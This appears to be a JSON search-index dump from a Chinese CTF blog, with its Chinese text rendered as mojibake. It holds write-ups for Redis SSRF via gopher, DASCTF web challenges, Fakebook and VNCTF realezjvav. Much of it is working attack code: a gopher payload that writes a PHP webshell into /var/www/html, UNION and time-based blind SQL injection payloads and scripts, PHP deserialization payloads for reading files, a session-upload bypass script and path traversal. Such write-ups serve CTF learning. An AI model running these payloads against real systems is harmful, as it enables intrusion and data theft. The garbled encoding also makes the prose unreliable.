redisçš„é…ç½®ï¼Œdiræ˜¯æ•°æ®åº“å¤‡ä»½æ–‡ä»¶æ”¾ç½®è·¯å¾„ï¼Œdbfilenameæ˜¯å¤‡ä»½æ–‡ä»¶åå­— save:ç«‹å³å¯¹æ­¤æ—¶çš„æ•°æ®è¿›è¡Œå¤‡ä»½ï¼Œredisæ•°æ®å¤‡ä»½æœ‰è§¦å‘æ¡ä»¶ï¼Œå…·ä½“çœ‹é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤ä¸»è¦è®©æ•°æ®åº“é©¬ä¸Šè¿›è¡Œå¤‡ä»½ ä¸‹è½½æµ‹è¯•çš„redis wget http://download.redis.io/releases/redis-2.8.17.tar.gz ç¼–è¯‘å®Œæˆåï¼Œå¼€å¯redisæœåŠ¡ ç”¨socatå¼€ä¸€ä¸ªç«¯å£è½¬å‘ï¼Œå¹¶è·å–æ•°æ®åŒ…ï¼Œå‘½ä»¤å¦‚ä¸‹ socat -v tcp-listen:1234,fork,reuseaddr tcp:localhost:6379 å°†æœ¬åœ°çš„1234ç«¯å£çš„æ•°æ®è½¬å‘åˆ°6379ç«¯å£ï¼Œä¹‹åç”¨redis-cliå®¢æˆ·ç«¯è¿æ¥ç«¯å£1234ï¼Œæ‰§è¡Œæ”»å‡»æµç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å–æ”»å‡»çš„æ•°æ® æ”»å‡»çš„æ•°æ® æ¥ç€å°†è¿™äº›æ•°æ®è½¬ä¸ºgopheråè®®çš„urlï¼š èˆå¼ƒå¼€å¤´ä¸º&lt;æˆ–&gt;çš„æ•°æ®ï¼Œè¿™äº›è¡¨ç¤ºè¯·æ±‚å’Œè¿”å› èˆå¼ƒå¼€å¤´ä¸º+OKçš„æ•°æ®ï¼Œè¡¨ç¤ºè¿”å›çš„ä¿¡æ¯ å°†\\ræ”¹ä¸º%0dï¼Œå°†æ¢è¡Œæ”¹ä¸º%0a $è¿›è¡Œurlç¼–ç  æˆ–è€…å¯ä»¥ä½¿ç”¨å·¥å…·ç”Ÿæˆpayload 1curl gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2422%0D%0A%0A%0A%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A å¾…è¡¥å……ã€‚ã€‚ã€‚ å‚è€ƒï¼š SSRFåˆ©ç”¨ Gopher åè®®æ‹“å±•æ”»å‡»é¢_BerL1nçš„åšå®¢-CSDNåšå®¢ 10.Redisæœªæˆæƒè®¿é—®æ¼æ´å¤ç°ä¸åˆ©ç”¨ - bmjoker - åšå®¢å›­ è§£å†³Mysql8+ç‰ˆæœ¬è¿œç¨‹è¿æ¥é—®é¢˜ï¼ˆäº²æµ‹æœ‰æ•ˆï¼‰ - ç¨‹åºå‘˜å¤§æœ¬è¥","categories":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"https://123-prog.github.io/tags/SSRF/"}]},{"title":"DASCTF ä¸‰æœˆèµ› webé¢˜å¤ç°","slug":"DASCTF-ä¸‰æœˆèµ›-webé¢˜å¤ç°","date":"2021-04-07T07:04:52.000Z","updated":"2021-09-22T09:57:23.603Z","comments":true,"path":"2021/04/07/DASCTF-ä¸‰æœˆèµ›-webé¢˜å¤ç°/","link":"","permalink":"https://123-prog.github.io/2021/04/07/DASCTF-%E4%B8%89%E6%9C%88%E8%B5%9B-web%E9%A2%98%E5%A4%8D%E7%8E%B0/","excerpt":"BestDB0x01æºç ç»™äº†æŸ¥è¯¢è¯­å¥ 1$sql = &quot;SELECT * FROM users WHERE id = &#x27;$query&#x27; OR username = \\&quot;$query\\&quot;&quot;;","text":"BestDB0x01æºç ç»™äº†æŸ¥è¯¢è¯­å¥ 1$sql = &quot;SELECT * FROM users WHERE id = &#x27;$query&#x27; OR username = \\&quot;$query\\&quot;&quot;; è¿‡æ»¤å•å¼•å·ï¼Œä½†æ²¡è¿‡æ»¤åŒå¼•å·ï¼Œæ‰€ä»¥é€‰æ‹©é—­åˆåé¢çš„ç”¨æˆ·åè¿›è¡ŒunionæŸ¥è¯¢ æŸ¥è¡¨å 12query=-1&quot;/**/union/**/select/**/group_concat(table_name),2,3/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23//f1agdas,users æŸ¥å­—æ®µ 12query=-1&quot;/**/union/**/select/**/group_concat(column_name),2,3/**/from/**/information_schema.columns/**/where/**/table_name=&quot;f1agdas&quot;%23//id,f1agdas æŸ¥æ•°æ® 12query=-1&quot;/**/union/**/select/**/f1agdas,2,3/**/from/**/f1agdas%23//flag.txt è¿”å›ä¸€ä¸ªæ–‡ä»¶åï¼Œä½¿ç”¨load_fileè¯»å–/flag.txtè·å¾—flagï¼Œflagè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨16è¿›åˆ¶ç¼–ç ç»•è¿‡ 1query=-1&quot;/**/union/**/select/**/load_file(0x2F666C61672E747874),2,3%23 ez_serialize0x01é¢˜ç›®ç»™äº†æºç ï¼Œåºåˆ—åŒ–çš„é¢˜ç›®ï¼Œä½†æ˜¯æºç ä¸­å¹¶æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç±»ï¼Œæ‰€ä»¥æ˜¯phpåŸç”Ÿç±»çš„åˆ©ç”¨ spl,æ ‡å‡†phpç±»åº“ï¼Œé‡Œé¢å­˜ç€ä¸€äº›phpåŸç”Ÿç±»ï¼Œå…¶ä¸­æœ‰å¯ä»¥éå†ç›®å½•æˆ–è¯»å–æ–‡ä»¶ DirectoryIterator éå†ç›®å½• ç›´æ¥echoä¼šè¾“å‡ºç›®å½•ä¸‹çš„.(å³è¡¨ç¤ºå½“å‰ç›®å½•çš„ç¬¦å·) FilesystemIterator éå†ç›®å½• ç›´æ¥echoä¼šè¾“å‡ºç›®å½•ä¸‹ç¬¬ä¸€ä¸ªæ–‡ä»¶å¤¹æˆ–æ–‡ä»¶å SplFileObject è¯»å–æ–‡ä»¶å†…å®¹ï¼ŒæŒ‰è¡Œè¯»å–ï¼Œè·¨è¡Œéœ€è¦éå† æºç å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 &lt;?phperror_reporting(0);highlight_file(__FILE__);class A&#123; public $class; public $para; public $check; public function __construct() &#123; $this-&gt;class = &quot;B&quot;; $this-&gt;para = &quot;ctfer&quot;; echo new $this-&gt;class ($this-&gt;para); &#125; public function __wakeup() &#123; $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123; echo new $this-&gt;class ($this-&gt;para); &#125; else die(&#x27;bad hacker~&#x27;); &#125;&#125;class B&#123; var $a; public function __construct($a) &#123; $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); &#125;&#125;class C&#123; function vaild($code)&#123; $pattern = &#x27;/[!|@|#|$|%|^|&amp;|*|=|\\&#x27;|&quot;|:|;|?]/i&#x27;; if (preg_match($pattern, $code))&#123; return false; &#125; else return true; &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new A;&#125; åˆ©ç”¨åŸç”Ÿç±»å…ˆè¯»å–var/www/htmlä¸‹æ–‡ä»¶ 123456789&lt;?phpclass A&#123; public $class = &#x27;FilesystemIterator&#x27;; public $para = &#x27;/var/www/html&#x27;; public $check;&#125;$a = new A();echo serialize($a);//O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:13:&quot;/var/www/html&quot;;s:5:&quot;check&quot;;N;&#125; æäº¤ 12?pop=O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:13:&quot;/var/www/html&quot;;s:5:&quot;check&quot;;N;&#125;//1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE è¯»å–è·å¾—çš„è¿™ä¸ªç›®å½• 123456789&lt;?phpclass A&#123; public $class = &#x27;FilesystemIterator&#x27;; public $para = &#x27;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE&#x27;; public $check;&#125;$a = new A();echo serialize($a);//O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:47:&quot;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE&quot;;s:5:&quot;check&quot;;N;&#125; æäº¤åè¾“å‡ºäº†flag.php æœ€åè¯»å–flag.php 123456789&lt;?phpclass A&#123; public $class = &#x27;SplFileObject&#x27;; public $para = &#x27;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.phpssss&#x27;; public $check;&#125;$a = new A();echo serialize($a);//O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;para&quot;;s:56:&quot;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;s:5:&quot;check&quot;;N;&#125; åœ¨æºç å¯ä»¥çœ‹åˆ°flag ez_loginæ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºäº†ï¼Œä¹Ÿæ²¡æ¥å¾—åŠå¤ç°ç¯å¢ƒå°±å…³äº†ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„writeupï¼Œä¸»è¦è®°å½•ä¸€ä¸‹å‰é¢ç»•è¿‡sessionæ£€æµ‹çš„æ–¹æ³•ï¼Œåé¢å°±æ˜¯ä¸€ä¸ªsqlç›²æ³¨ æºç  1234567891011121314151617181920212223&lt;?php if(!isset($_SESSION))&#123; highlight_file(__FILE__); die(&quot;no session&quot;); &#125; include(&quot;./php/check_ip.php&quot;); error_reporting(0); $url = $_GET[&#x27;url&#x27;]; if(check_inner_ip($url))&#123; if($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1); $output = curl_exec($ch); $result_info = curl_getinfo($ch); curl_close($ch); &#125; &#125;else&#123; echo &quot;Your IP is internal yoyoyo&quot;; &#125;?&gt; é¢˜ç›®æ€è·¯æ˜¯é€šè¿‡ssrfå»è®¿é—®åˆ°åå°çš„admin.phpï¼Œç„¶åè¿›è¡Œsqlæ³¨å…¥æ‹¿flag ç”±æºç å¯ä»¥çœ‹åˆ°ï¼Œå¿…é¡»è¦å­˜åœ¨sessionä¼šè¯æ‰å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥çš„ssrf åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSå¯ä»¥ç»•è¿‡ï¼Œphpåœ¨æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼Œä¼šåœ¨sessionä¸­å­˜æ”¾ä¸Šä¼ æ–‡ä»¶çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¸Šä¼ è¿›åº¦ï¼Œæ–‡ä»¶åç­‰ç­‰ï¼Œå½“ç„¶ï¼Œæ–‡ä»¶ä¸Šä¼ æˆåŠŸåå°±ä¼šè¢«åˆ é™¤ï¼Œä½†è¿™é‡Œå…¶å®å¯ä»¥åˆ©ç”¨ï¼Œåªè¦æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªè¶³å¤Ÿå¤§çš„æ–‡ä»¶ï¼Œåˆ©ç”¨æ¡ä»¶ç«äº‰çš„è¯ï¼Œå†æ­é…æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°±æœ‰å¯èƒ½å°†æ¶æ„ä»£ç æ³¨å…¥åº”ç”¨ç¨‹åºï¼Œè¿™ä¸ªä¹‹åç ”ç©¶ åœ¨é…ç½®ä¸­ï¼Œsession.use_strict_mode=offè¿™ä¸ªé€‰é¡¹é»˜è®¤å€¼ä¸ºoffï¼Œè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­sessionidå¯æ§ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥éšæ„æ„é€ ä¸€ä¸ªPHPSESSIDï¼Œè¿™æ ·å°±æˆåŠŸè·å¾—äº†ä¸€ä¸ªä¼šè¯ æµ‹è¯•ä»£ç  12345678&lt;?phpif(!isset($_SESSION))&#123; highlight_file(__FILE__); die(&quot;no session&quot;);&#125;else&#123; echo &quot;you are successful&quot;;&#125; è„šæœ¬ 1234567891011import requestssession = requests.Session()url = &quot;http://127.0.0.1/1.php&quot;myData = &#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;nappingCat&#x27;&#125;myFile = &#123;&#x27;file&#x27;:(&#x27;1.txt&#x27;,&#x27;somethingnotimportant&#x27;)&#125;myCookie = &#123;&#x27;PHPSESSID&#x27;:&#x27;nappingCat&#x27;&#125;proxies=&#123;&#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;,&#x27;https&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;r = session.post(url=url, data=myData, files=myFile, cookies=myCookie, proxies=proxies, verify=False) åˆ©ç”¨bpæŠ“åŒ… å¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨å­˜æ”¾sessionçš„ç›®å½•ä¸‹çœ‹åˆ°æ–‡ä»¶ æ–‡ä»¶å†…å®¹æ˜¯ç©ºçš„ï¼Œå› ä¸ºå·²ç»ä¸Šä¼ ç»“æŸäº†","categories":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"}],"tags":[{"name":"DASCTF","slug":"DASCTF","permalink":"https://123-prog.github.io/tags/DASCTF/"}]},{"title":"(ç½‘é¼æ¯ 2018)Fakebook","slug":"ç½‘é¼æ¯-2018-Fakebook","date":"2021-04-05T06:23:57.000Z","updated":"2021-09-22T09:57:07.353Z","comments":true,"path":"2021/04/05/ç½‘é¼æ¯-2018-Fakebook/","link":"","permalink":"https://123-prog.github.io/2021/04/05/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/","excerpt":"0x01joinåˆ›å»ºä¸€ä¸ªè´¦å·ï¼Œç™»å½•ï¼Œåœ¨è¿™ä¸ªé¡µé¢å­˜åœ¨sqli /view.php?no=1 è¿‡æ»¤äº†union selectï¼Œä½¿ç”¨union all selectå¯ä»¥","text":"0x01joinåˆ›å»ºä¸€ä¸ªè´¦å·ï¼Œç™»å½•ï¼Œåœ¨è¿™ä¸ªé¡µé¢å­˜åœ¨sqli /view.php?no=1 è¿‡æ»¤äº†union selectï¼Œä½¿ç”¨union all selectå¯ä»¥ çˆ†è¡¨å 12/view.php?no=-1/**/union/**/all/**/select 1,group_concat(table_name),3,4/**/from information_schema.tables/**/where/**/table_schema=database()#/*users*/ çˆ†å­—æ®µå 12/view.php?no=-1/**/union/**/all/**/select 1,group_concat(column_name),3,4/**/from information_schema.columns/**/where/**/table_name=&#x27;users&#x27;#/*no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS*/ è¿™é‡Œçš„dataå¯¹åº”æˆ‘ä»¬åˆ›å»ºè´¦å·æ—¶è¾“å…¥çš„åšå®¢ è¯•ç€æŸ¥è¯¢ä¸€ä¸‹ 12/view.php?no=-1/**/union/**/all/**/select/**/1,data,3,4/**/from/**/users/**/limit 0,1#/*O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:8:&quot;1212.com&quot;;&#125;*/ å¾—åˆ°ä¸€ä¸²åºåˆ—åŒ–å†…å®¹ 0x02æ ¹ç›®å½•å­˜åœ¨robots.txtæ–‡ä»¶ï¼Œå‘ç°æºç æ–‡ä»¶å 12User-agent: *Disallow: &#x2F;user.php.bak ä¸‹è½½æºç  1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; æ³¨æ„getæ–¹æ³•ï¼Œå­˜åœ¨ssrfæ¼æ´ï¼Œè€Œæ•°æ®åº“ä¸­ä»¥ä¸€ä¸²åºåˆ—åŒ–æ•°æ®å­˜æ”¾è¿™ä¸ªç”¨æˆ·ä¿¡æ¯ç±»ï¼ŒæŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯æ—¶ä¼šä»æ•°æ®åº“ä¸­æ‹¿å‡ºæ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åè·å–åšå®¢åœ°å€çš„å†…å®¹ 0x03åˆ©ç”¨ï¼Œæ„é€ åºåˆ—åŒ–ä¸²ï¼Œåˆ©ç”¨fileåè®®ï¼Œè¯»å–ä»»æ„æ–‡ä»¶ payload 1/view.php?no=-1/**/union/**/all/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; webæ ¹ç›®å½•å‰é¢sqliæ—¶æŠ¥é”™ä¼šç»™å‡º æäº¤payloadåçœ‹æºç ï¼Œå¾—åˆ°ä¸€ä¸²base64ï¼Œé‚£å°±æ˜¯flag.phpçš„å†…å®¹ï¼Œè§£ç å¾—åˆ°flag 1PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s5Nzk2YTIzNC1mZGIzLTQxNGMtODdjOC03NTgyNWYwZmEzMDl9IjsNCmV4aXQoMCk7DQo&#x3D; 0x04è¿˜æœ‰ä¸€ç§åšæ³•ï¼Œå®Œå…¨çš„sqliï¼Œä¸éœ€è¦åˆ©ç”¨åˆ°ååºåˆ—åŒ– ä½¿ç”¨load_file()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpååºåˆ—åŒ–","slug":"CTF/phpååºåˆ—åŒ–","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://123-prog.github.io/tags/sqli/"},{"name":"SSRF","slug":"SSRF","permalink":"https://123-prog.github.io/tags/SSRF/"}]},{"title":"VNCTF 2021 realezjvav","slug":"VNCTF-2021-realezjvav","date":"2021-04-04T06:14:24.000Z","updated":"2021-09-22T10:03:00.316Z","comments":true,"path":"2021/04/04/VNCTF-2021-realezjvav/","link":"","permalink":"https://123-prog.github.io/2021/04/04/VNCTF-2021-realezjvav/","excerpt":"0x01 ç¬¬ä¸€å…³sqlæ³¨å…¥æ²¡æœ‰æŸ¥è¯¢çš„å›æ˜¾ï¼Œåªæœ‰ä¸€ä¸ªOnly the admin can get the right pageæç¤ºï¼Œåº”è¯¥æ˜¯éœ€è¦ä»¥adminèº«ä»½ç™»å½•ï¼Œæ‰€ä»¥éœ€è¦æ³¨å…¥è·å¾—å¯†ç  å°è¯•æŠ¥é”™ï¼Œ æäº¤username=admin&amp;password=1&#39;è¿”å›500 Internal Server Error æäº¤username=admin&amp;password=1#&#39;å›æ˜¾æ­£å¸¸ï¼Œè¯æ˜sqlè¯­å¥æŠ¥é”™ä¼šç›´æ¥è¿”å›500 Internal Server Error","text":"0x01 ç¬¬ä¸€å…³sqlæ³¨å…¥æ²¡æœ‰æŸ¥è¯¢çš„å›æ˜¾ï¼Œåªæœ‰ä¸€ä¸ªOnly the admin can get the right pageæç¤ºï¼Œåº”è¯¥æ˜¯éœ€è¦ä»¥adminèº«ä»½ç™»å½•ï¼Œæ‰€ä»¥éœ€è¦æ³¨å…¥è·å¾—å¯†ç  å°è¯•æŠ¥é”™ï¼Œ æäº¤username=admin&amp;password=1&#39;è¿”å›500 Internal Server Error æäº¤username=admin&amp;password=1#&#39;å›æ˜¾æ­£å¸¸ï¼Œè¯æ˜sqlè¯­å¥æŠ¥é”™ä¼šç›´æ¥è¿”å›500 Internal Server Error é‚£å°±å†è¯•è¯•ç›²æ³¨ï¼Œå…ˆè·‘ä¸€ä¸‹è¿‡æ»¤äº†ä»€ä¹ˆ åœ¨å¯†ç ä¸­å¦‚æœåŒ…å«è¢«è¿‡æ»¤å…³é”®å­—ä¼šè¿”å›hackerå­—æ · åœ¨burpsuiteä¸­ç”¨å­—å…¸è·‘ä¸€ä¸‹ å› ä¸ºæ²¡æœ‰å…·æœ‰ä¸€å®šåŒºåˆ«çš„å›æ˜¾ï¼Œæ‰€ä»¥å¸ƒå°”ç›²æ³¨å¯èƒ½æœ‰ç‚¹å›°éš¾ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯åŸºäºæ—¶é—´çš„ç›²æ³¨ sleep benchmarkéƒ½è¢«è¿‡æ»¤äº†ï¼Œifæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œé‚£åªèƒ½å°è¯•ç¬›å¡å°”ç§¯æ³¨å…¥ï¼ŒæŸ¥è¯¢å¤šä¸ªè¡¨ç»„åˆçš„ç¬›å¡å°”ç§¯ï¼Œæ‹–æ…¢æŸ¥è¯¢çš„é€Ÿåº¦ è¿™é‡Œç›´æ¥è´´è„šæœ¬ï¼ŒæŸ¥è¯¢tables,tables,tablesç»„åˆæ˜¯1ç§’çš„å»¶è¿Ÿï¼Œèµ›åå¤ç°æŸ¥è¯¢é€Ÿåº¦æ¯”è¾ƒç¨³å®šï¼Œç”¨è¿™ä¸ªç»„åˆä¹Ÿå¯ä»¥ï¼Œåœ¨æ¯”èµ›å½“å¤©ï¼Œå¯èƒ½ä¼šæœ‰ç‚¹ä¸ç¨³å®šï¼Œéœ€è¦å°è¯•å»¶è¿Ÿæ—¶é—´æ›´ä¹…çš„ç¬›å¡å°”ç§¯ç»„åˆ 123456789101112131415161718192021222324252627282930import requestsimport timeurl = &quot;http://86bc3400-4280-4297-9054-69a81218790d.node3.buuoj.cn/user/login&quot;password = &quot;&quot;#no_0ne_kn0w_th1sfor i in range(20): max = 128 min = 32 while True: j = (max + min) &gt;&gt; 1 #print(j) payload = &quot;-1&#x27;/**/if(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;,(select/**/count(*)/**/from/**/information_schema.tables/**/a,information_schema.tables/**/c,information_schema.tables/**/b),1)#&quot;.format(i,j) data = &#123; &quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:payload &#125; start_time = time.time() r = requests.post(url=url, data=data) end_time = time.time() #print(end_time-start_time) if (end_time-start_time) &gt; 0.7: min = j+1 else: max = j if(max &lt;= min): password += chr(min) print(password) break å¾—åˆ°å¯†ç åå°±å¯ä»¥ç™»å½•äº† 0x02 ç¬¬äºŒå…³ç™»å½•æˆåŠŸè·³è½¬åˆ°ä¸€ä¸ªè§’è‰²é€‰æ‹©é¡µé¢ ç”¨burpsuiteæŠ“åŒ…ï¼Œå‘ç°è¯·æ±‚å‘é€çš„æ˜¯jsonæ ¼å¼æ•°æ®ï¼Œå…«ä¹ä¸ç¦»åå°±æ˜¯javaçš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ é˜…è¯»æºç å‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶ä»»æ„è¯» ç†Ÿæ‚‰javaé¡¹ç›®çš„è¯ï¼Œå°±å¯ä»¥å°è¯•è¯»å–ä¸€ä¸‹pom.xmlæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ä½¿ç”¨mavenæ„å»ºjavaé¡¹ç›®æ—¶ç”¨äºå£°æ˜ä¾èµ–çš„åœ°æ–¹ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥çœ‹åˆ°è¿™ä¸ªjavaé¡¹ç›®ç”¨äº†ä»€ä¹ˆä¾èµ– /searchimage?img=../../../../../pom.xml è¿”å›pom.xmlå†…å®¹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.3.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;springbootdemo&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;springbootdemo&lt;/name&gt; &lt;description&gt;vn&amp;apos;s Demo for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt; &lt;configuration&gt; &lt;configurationFile&gt;src/main/resources/generator/generatorConfig.xml&lt;/configurationFile&gt; &lt;overwrite&gt;true&lt;/overwrite&gt; &lt;verbose&gt;true&lt;/verbose&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/build&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.27&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;repositories&gt; &lt;repository&gt; 